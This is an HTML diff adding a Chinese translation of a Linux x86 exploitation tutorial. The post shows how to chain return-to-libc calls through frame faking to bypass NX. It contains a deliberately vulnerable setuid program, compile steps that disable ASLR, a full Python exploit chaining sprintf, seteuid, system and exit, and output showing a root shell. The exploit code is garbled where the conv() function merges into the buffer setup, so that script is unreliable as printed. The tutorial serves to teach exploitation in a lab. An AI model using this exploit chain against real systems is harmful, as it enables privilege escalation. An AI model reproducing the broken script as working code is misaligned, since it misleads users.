@@ -95,14 +95,6 @@
 </header>
 
 
-  <div style="background:#fff;width: 100%;">
-
-      <div style="max-height:600px; overflow: hidden;">
-        <img width="100%" alt="Hike News" src="/css/images/pose.jpg">
-      </div>
-
-  </div>
-
 
 
   <div id="container">
@@ -111,6 +103,134 @@
       <div id="content" class="outer">
         
           <section id="main">
+  
+    <article id="post-chainingreturntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170101/chainingreturntolibc/" class="article-date">
+	  <time datetime="2017-01-01T02:39:58.000Z" itemprop="datePublished">一月 1, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 什么Return-to-libc链接</li>
+<li>0x02 什么是帧欺骗</li>
+<li>0x03 leave ret指令是如何调用其上方libc函数的</li>
+</ul>
+</blockquote>
+<p><u>阅读基础</u>:</p>
+<ul>
+<li>1.<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
+<li>2.<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Return-to-libc绕过NX</a></li>
+</ul>
+<p><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
+<h3 id="什么是Return-to-libc链接"><a href="#什么是Return-to-libc链接" class="headerlink" title="什么是Return-to-libc链接"></a>什么是Return-to-libc链接</h3><p>在<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中可以看出，攻击者需要调用多个libc函数才能成功利用漏洞。一种链接libc函数的简单方法就是将不同libc函数依次放在栈中。但由于函数参数的原因，这是不可能的。现在你可能还不明白，没关系，继续往下读就好。</p>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span></div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>注意</u>: 上述代码和<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中的(vuln_priv.c)一样。</p>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>正如<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>所说，链接seteuid,system和exit函数能允许我们利用漏洞代码”vuln”。但并没有这么简单直接，主要在于下面这两个问题：</p>
+<ul>
+<li>1.攻击者需要将两个libc函数参数或者其中一个libc函数参数与另一个libc函数地址放在栈的同一位置。显然这是不可能的(如下图所示)</li>
+<li>2.seteuid_arg必须为0.由于我们的缓冲区溢出是由strcpy操作引起的，0变成了一个不好的字符。比如，strcpy函数不会将0之后的字符拷贝到栈中。</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>我们来看看如何解决上述两个问题。</p>
+<p><u>问题1</u>: 为解决这个问题，Nergal在<a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">phrack</a>中提出了两个聪明的技术</p>
+<ul>
+<li><ol>
+<li>ESP上升(ESP Lifting)</li>
+</ol>
+</li>
+<li><ol>
+<li>帧欺骗(Frame fakeing)</li>
+</ol>
+</li>
+</ul>
+<p>由于ESP lifting技术要求二进制文件在编译的时候不能设置帧指针(-fomit-frame-pointer)，这里我们只谈帧欺骗技术。 由于我们的二进制文件(vuln)含有帧指针，只好采用帧欺骗技术。</p>
+<h3 id="什么是帧欺骗"><a href="#什么是帧欺骗" class="headerlink" title="什么是帧欺骗"></a>什么是帧欺骗</h3><p>这项技术不去覆盖返回地址，而是直接覆盖libc函数地址(这个例子中的seteuid函数)，我们采用”leave ret”指令来覆盖。 这让攻击者有机会将函数参数存放在栈中而不必有任何交叉，而且能调用相应的libc函数，并不会带来任何问题。</p>
+<p><u>栈布局</u> 如下面栈布局所示，帧指针攻击者溢出栈并成功链接libc函数: seteuid, system与exit：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>上图中红色强调的部分是”leave ret”指令调用其上方libc函数的返回地址。举个例子，第一条”leave ret”指令(位于栈地址0xbffff1fc处)调用seteuid()，第二条”leave ret”指令(位于栈地址0xbffff20c处)调用system()，第三条”leave ret”指令(位于栈地址0xbffff21c处)调用exit().</p>
+<h3 id="leave-ret指令是如何调用其上方libc函数的"><a href="#leave-ret指令是如何调用其上方libc函数的" class="headerlink" title="leave ret指令是如何调用其上方libc函数的"></a>leave ret指令是如何调用其上方libc函数的</h3><p>为了回答这个问题，首先我们要了解”leave”指令。一条”leave”指令可以翻译成:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ebp,esp            <span class="comment">//esp = ebp</span></div><div class="line">pop ebp                <span class="comment">//ebp = *esp</span></div></pre></td></tr></table></figure>
+<p>我们来反汇编main()函数，以便更进一步了解“leave ret”指令</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">  ...</div><div class="line">  <span class="number">0x0804851c</span> &lt;+<span class="number">88</span>&gt;: leave                  <span class="comment">//mov ebp, esp; pop ebp;</span></div><div class="line">  <span class="number">0x0804851d</span> &lt;+<span class="number">89</span>&gt;: ret                    <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p><u>Main尾声代码</u>:</p>
+<p>如上述栈布局所示，在main函数尾声代码执行之前，攻击者已经溢出栈并用fake_ebp0(0xbffff204)覆盖了main函数的ebp，以及利用”leave ret”指令地址(0x0804851c)覆盖了其返回地址。 现在当CPU要执行main函数的尾声代码时，EIP指向text地址0x0804851c（”leave ret”)。在执行过程中，会发生下面的事情：</p>
+<ul>
+<li>‘leave’修改了下面的寄存器<ul>
+<li>esp = ebp = 0xbffff1f8</li>
+<li>ebp = 0xbffff204, esp = 0xbffff1fc</li>
+</ul>
+</li>
+<li>‘ret’执行”leave ret”指令(位于栈地址0xbffff1fc处)</li>
+</ul>
+<p><u>seteuid</u>: 现在EIP又重新指向text地址0x0804851c(“leave ret”). 在执行过程中，会发生下面的事情：</p>
+<ul>
+<li>‘leave’修改了下面的寄存器<ul>
+<li>esp = ebp = 0xbffff204</li>
+<li>ebp = 0xbffff214, esp =0xbffff208</li>
+</ul>
+</li>
+<li>‘ret’执行seteuis()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）</li>
+<li>调用seteuid()后，”leave ret”指令(位于栈地址0xbffff20c处)开始执行</li>
+</ul>
+<p>可以从上面的栈布局看出，执行上述过程，栈已经按照攻击者的意图设置好，system和exit函数都能得到执行。</p>
+<p><u>问题2</u>: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcp函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。</p>
+<p><u>注意</u>: 但不幸地是我的libc.so.6中strcpy函数的地址是0xb7ea6200。 libc函数地址本身包含一个NULL字节(不好的字符!)。 因此，strcpy不能成功地利用漏洞代码。sprintf（函数地址是0xb7e6e8d0)可以用来替代strcpy。使用sprintf时，NULL字节被拷贝到seteuid_arg在栈中的位置。</p>
+<p>因此链接下面的libc函数可以解决上面提到的两个问题并成功获取root shell:</p>
+<pre><code>sprintf|sprintf|sprintf|sprintf|seteuid|system|exit
+</code></pre><p><u>漏洞利用代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fake_ebp0 = <span class="number">0xbffff1a0</span></div><div class="line">fake_ebp1 = <span class="number">0xbffff1b8</span></div><div class="line">fake_ebp2 = <span class="number">0xbffff1d0</span></div><div class="line">fake_ebp3 = <span class="number">0xbffff1e8</span></div><div class="line">fake_ebp4 = <span class="number">0xbffff204</span></div><div class="line">fake_ebp5 = <span class="number">0xbffff214</span></div><div class="line">fake_ebp6 = <span class="number">0xbffff224</span></div><div class="line">fake_ebp7 = <span class="number">0xbffff234</span></div><div class="line">leave_ret = <span class="number">0x0804851c</span></div><div class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span></div><div class="line">seteuid_addr = <span class="number">0xb7f09720</span></div><div class="line">system_addr = <span class="number">0xb7e61060</span></div><div class="line">exit_addr = <span class="number">0xb7e54be0</span></div><div class="line">sprintf_arg1 = <span class="number">0xbffff210</span></div><div class="line">sprintf_arg2 = <span class="number">0x80485f0</span></div><div class="line">sprintf_arg3 = <span class="number">0xbffff23c</span></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line">exit_arg = <span class="number">0xffffffff</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num* <span class="number">264</span> </div><div class="line">buf += conv(fake_ebp0) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Below four <span class="built_in">stack</span> frames are <span class="keyword">for</span> <span class="built_in">sprintf</span> (to setup seteuid arg )</div><div class="line">buf += conv(fake_ebp1) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp2) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp3) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp4) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3)</div><div class="line">#Dummy - To avoid null byte in fake_ebp4. </div><div class="line">buf += <span class="string">"X"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> seteuid</div><div class="line">buf += conv(fake_ebp5) </div><div class="line">buf += conv(seteuid_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Dummy - This arg is zero'd by above four <span class="built_in">sprintf</span> calls</div><div class="line">buf += <span class="string">"Y"</span> * <span class="number">4</span> </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> system</div><div class="line">buf += conv(fake_ebp6) </div><div class="line">buf += conv(system_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(system_arg) </div><div class="line">#Below <span class="built_in">stack</span> frame is <span class="keyword">for</span> <span class="built_in">exit</span></div><div class="line">buf += conv(fake_ebp7) </div><div class="line">buf += conv(exit_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(exit_arg) </div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上面的漏洞利用代码就可以拿到root shell!!!</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����������������\��������������\��������������\�������������\��� �������AAAA0�������Ѕ</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>现在已经成功绕过NX,<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt/" target="_blank" rel="external">下一篇</a>文章让我们来看看如果绕过ASLR.</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
   
     <article id="post-returntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
@@ -1395,6 +1515,18 @@ size:拥有在TOP4会议中发表论文的作者数量
               <div class="widget-entry-summary" style="margin: 0;">
             
 
+              <h6 style="margin: 0;"><a href="/20170102/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a></h6>
+              <span>一月 2, 2017</span>
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
               <h6 style="margin: 0;"><a href="/20170102/kvmqemuintro/">KVM/QEMU虚拟化简介</a></h6>
               <span>一月 2, 2017</span>
             </div>
@@ -1497,18 +1629,6 @@ size:拥有在TOP4会议中发表论文的作者数量
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a></h6>
-              <span>一月 1, 2017</span>
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1519,7 +1639,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">4</span></li></ul>
     </div>
   </div>
 
@@ -1529,7 +1649,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QEMU/">QEMU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">5</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Conference/">Conference</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Introspection/">Introspection</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KVM/">KVM</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/">Kernel</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Libvmi/">Libvmi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Memory/">Memory</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Overflow/">Overflow</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QEMU/">QEMU</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack/">Stack</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/System/">System</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtualization/">Virtualization</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Volatility/">Volatility</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1539,7 +1659,7 @@ size:拥有在TOP4会议中发表论文的作者数量
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17.14px;">Exploit</a> <a href="/tags/Introspection/" style="font-size: 14.29px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 11.43px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 11.43px;">Kernel</a> <a href="/tags/Linux/" style="font-size: 12.86px;">Linux</a> <a href="/tags/Memory/" style="font-size: 12.86px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.43px;">Overflow</a> <a href="/tags/QEMU/" style="font-size: 10px;">QEMU</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.43px;">Stack</a> <a href="/tags/System/" style="font-size: 18.57px;">System</a> <a href="/tags/Virtualization/" style="font-size: 15.71px;">Virtualization</a>
+      <a href="/tags/Conference/" style="font-size: 10px;">Conference</a> <a href="/tags/Exploit/" style="font-size: 17.14px;">Exploit</a> <a href="/tags/Introspection/" style="font-size: 14.29px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 11.43px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 11.43px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 10px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 12.86px;">Linux</a> <a href="/tags/Memory/" style="font-size: 12.86px;">Memory</a> <a href="/tags/Overflow/" style="font-size: 11.43px;">Overflow</a> <a href="/tags/QEMU/" style="font-size: 10px;">QEMU</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Stack/" style="font-size: 11.43px;">Stack</a> <a href="/tags/System/" style="font-size: 18.57px;">System</a> <a href="/tags/Virtualization/" style="font-size: 15.71px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a>
     </div>
   </div>
 
@@ -1549,7 +1669,7 @@ size:拥有在TOP4会议中发表论文的作者数量
     <h3 class="widget-title">归档</h3>
 
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">8</span></li></ul>
     </div>
   </div>
 
